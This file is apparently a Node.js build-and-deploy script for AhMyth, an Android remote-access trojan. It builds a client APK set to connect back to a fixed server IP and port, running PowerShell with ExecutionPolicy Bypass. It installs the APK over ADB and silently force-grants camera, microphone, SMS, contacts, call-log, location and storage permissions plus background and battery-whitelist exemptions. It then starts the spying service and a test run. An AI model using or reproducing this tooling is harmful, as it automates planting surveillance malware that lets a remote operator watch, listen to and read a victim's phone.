#!/usr/bin/env node
/**
 * Build, Install, Run and Test Suite
 * Automatically builds APK with specified IP/port, installs, runs, and tests
 */

const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const path = require('path');
const fs = require('fs');

const execAsync = promisify(exec);

// Configuration
const SERVER_IP = '192.168.0.177';
const SERVER_PORT = 1234;
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';
const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const QUICK_BUILD_SCRIPT = path.join(FACTORY_PATH, 'quick-build.ps1');

// Colors
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    blue: "\x1b[34m"
};

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    switch(type) {
        case 'success': color = colors.green; break;
        case 'error': color = colors.red; break;
        case 'warn': color = colors.yellow; break;
        case 'header': color = colors.cyan; break;
        case 'info': color = colors.blue; break;
    }
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

async function checkAdbDevice() {
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        const devices = lines.filter(line => line.includes('device') && !line.includes('offline'));
        
        if (devices.length === 0) {
            log('No ADB devices found', 'error');
            return null;
        }
        
        log(`Found ${devices.length} device(s)`, 'success');
        return devices[0].split('\t')[0];
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        return null;
    }
}

async function buildApk() {
    log('Building APK with server configuration...', 'header');
    log(`Target: ${SERVER_IP}:${SERVER_PORT}`, 'info');
    
    try {
        // Use PowerShell to run quick-build.ps1
        const buildCmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Set-Location '${FACTORY_PATH}'; .\\quick-build.ps1 -IP '${SERVER_IP}' -Port ${SERVER_PORT} }"`;
        
        log('Executing build command...', 'info');
        const { stdout, stderr } = await execAsync(buildCmd, { 
            maxBuffer: 10 * 1024 * 1024,
            cwd: FACTORY_PATH 
        });
        
        if (stderr && !stderr.includes('Warning')) {
            log(`Build warnings: ${stderr}`, 'warn');
        }
        
        // Find the latest built APK
        const apkFiles = fs.readdirSync(FACTORY_PATH)
            .filter(f => f.includes('aligned-debugSigned.apk') && f.startsWith('Ahmyth-'))
            .map(f => ({
                name: f,
                path: path.join(FACTORY_PATH, f),
                time: fs.statSync(path.join(FACTORY_PATH, f)).mtime
            }))
            .sort((a, b) => b.time - a.time);
        
        if (apkFiles.length === 0) {
            throw new Error('No APK file found after build');
        }
        
        const apkFile = apkFiles[0];
        log(`APK built: ${apkFile.name}`, 'success');
        log(`Size: ${(fs.statSync(apkFile.path).size / 1024 / 1024).toFixed(2)} MB`, 'info');
        
        return apkFile.path;
    } catch (error) {
        log(`Build failed: ${error.message}`, 'error');
        if (error.stdout) log(`Output: ${error.stdout}`, 'debug');
        if (error.stderr) log(`Error: ${error.stderr}`, 'error');
        throw error;
    }
}

async function installApk(apkPath, deviceId) {
    log('Installing APK...', 'header');
    
    try {
        // Uninstall previous version
        log('Uninstalling previous version...', 'info');
        await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} uninstall ${PACKAGE_NAME}`).catch(() => {
            // Ignore if not installed
        });
        
        // Install new APK
        log('Installing APK...', 'info');
        const { stdout, stderr } = await execAsync(
            `adb ${deviceId ? `-s ${deviceId}` : ''} install -r -g "${apkPath}"`,
            { maxBuffer: 10 * 1024 * 1024 }
        );
        
        if (stdout.includes('Success') || stdout.includes('success')) {
            log('APK installed successfully', 'success');
        } else {
            throw new Error(`Installation failed: ${stdout || stderr}`);
        }
    } catch (error) {
        log(`Installation failed: ${error.message}`, 'error');
        throw error;
    }
}

async function grantPermissions(deviceId) {
    log('Granting permissions...', 'header');
    
    const permissions = [
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.WRITE_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.SEND_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.ACCESS_BACKGROUND_LOCATION',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.POST_NOTIFICATIONS',
        'android.permission.GET_ACCOUNTS',
        'android.permission.ACCESS_WIFI_STATE',
        'android.permission.CHANGE_WIFI_STATE'
    ];
    
    const appops = [
        'SYSTEM_ALERT_WINDOW',
        'GET_USAGE_STATS',
        'WRITE_SETTINGS',
        'MANAGE_EXTERNAL_STORAGE',
        'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
        'RUN_IN_BACKGROUND',
        'RUN_ANY_IN_BACKGROUND'
    ];
    
    let granted = 0;
    let failed = 0;
    
    // Grant runtime permissions
    for (const perm of permissions) {
        try {
            await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} shell pm grant ${PACKAGE_NAME} ${perm}`);
            granted++;
        } catch (error) {
            failed++;
        }
    }
    
    // Grant special permissions
    for (const op of appops) {
        try {
            await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} shell appops set ${PACKAGE_NAME} ${op} allow`);
            granted++;
        } catch (error) {
            failed++;
        }
    }
    
    // Battery optimization whitelist
    try {
        await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} shell cmd deviceidle whitelist +${PACKAGE_NAME}`);
        granted++;
    } catch (error) {
        failed++;
    }
    
    log(`Permissions granted: ${granted} successful, ${failed} failed`, granted > 0 ? 'success' : 'warn');
}

async function startApp(deviceId) {
    log('Starting app...', 'header');
    
    try {
        // Start MainActivity
        await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
        
        // Wait a moment
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Start MainService
        await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} shell am startservice ${PACKAGE_NAME}/${PACKAGE_NAME}.MainService`);
        
        // Verify app is running
        await new Promise(resolve => setTimeout(resolve, 2000));
        const { stdout } = await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} shell pidof ${PACKAGE_NAME}`);
        
        if (stdout.trim()) {
            log('App is running', 'success');
            log(`PID: ${stdout.trim()}`, 'info');
        } else {
            log('App may not be running (check manually)', 'warn');
        }
    } catch (error) {
        log(`Error starting app: ${error.message}`, 'error');
        // Continue anyway
    }
}

async function waitForConnection(maxWait = 30000) {
    log('Waiting for client to connect...', 'header');
    
    const startTime = Date.now();
    while (Date.now() - startTime < maxWait) {
        try {
            // Check if service is running
            const { stdout } = await execAsync(`adb shell dumpsys activity services | grep ${PACKAGE_NAME}`);
            if (stdout.includes('MainService')) {
                log('Service is running', 'success');
                // Give it a moment to connect
                await new Promise(resolve => setTimeout(resolve, 3000));
                return true;
            }
        } catch (error) {
            // Service not found yet
        }
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        process.stdout.write('.');
    }
    
    console.log('');
    log('Connection wait timeout', 'warn');
    return false;
}

async function runTestSuite() {
    log('Starting test suite...', 'header');
    
    // Spawn test suite as separate process to avoid conflicts
    return new Promise((resolve, reject) => {
        log('Launching test suite process...', 'info');
        const testProcess = spawn('node', ['test-comprehensive-suite.js'], {
            stdio: 'inherit',
            shell: true,
            cwd: __dirname
        });
        
        testProcess.on('close', (code) => {
            if (code === 0) {
                log('Test suite completed successfully', 'success');
                resolve();
            } else {
                log(`Test suite exited with code ${code}`, 'error');
                // Don't reject - allow script to complete even if some tests fail
                resolve();
            }
        });
        
        testProcess.on('error', (error) => {
            log(`Test suite error: ${error.message}`, 'error');
            // Don't reject - continue anyway
            resolve();
        });
    });
}

async function main() {
    log('╔════════════════════════════════════════════════════════════╗', 'header');
    log('║     AhMyth Build, Install, Run & Test Suite              ║', 'header');
    log('╚════════════════════════════════════════════════════════════╝', 'header');
    log('');
    
    try {
        // Step 1: Check device
        log('[1/6] Checking ADB device...', 'header');
        const deviceId = await checkAdbDevice();
        if (!deviceId) {
            log('No device found. Please connect a device or start an emulator.', 'error');
            process.exit(1);
        }
        log(`Using device: ${deviceId}`, 'success');
        
        // Step 2: Build APK
        log('[2/6] Building APK...', 'header');
        const apkPath = await buildApk();
        
        // Step 3: Install APK
        log('[3/6] Installing APK...', 'header');
        await installApk(apkPath, deviceId);
        
        // Step 4: Grant permissions
        log('[4/6] Granting permissions...', 'header');
        await grantPermissions(deviceId);
        
        // Step 5: Start app
        log('[5/6] Starting app...', 'header');
        await startApp(deviceId);
        
        // Step 6: Wait for connection and run tests
        log('[6/6] Waiting for connection and running tests...', 'header');
        const connected = await waitForConnection(30000);
        
        if (!connected) {
            log('Connection timeout, but continuing with tests...', 'warn');
            log('Make sure the app is running and can reach the server', 'info');
        }
        
        log('', 'header');
        log('════════════════════════════════════════════════════════════', 'header');
        log('Starting Comprehensive Test Suite', 'header');
        log('════════════════════════════════════════════════════════════', 'header');
        log('', 'header');
        
        // Give app a moment to fully initialize
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Run test suite
        await runTestSuite();
        
    } catch (error) {
        log(`Fatal error: ${error.message}`, 'error');
        if (error.stack) {
            log(error.stack, 'debug');
        }
        process.exit(1);
    }
}

// Run if executed directly
if (require.main === module) {
    main().catch(error => {
        log(`Fatal error: ${error.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { main, buildApk, installApk, grantPermissions, startApp };

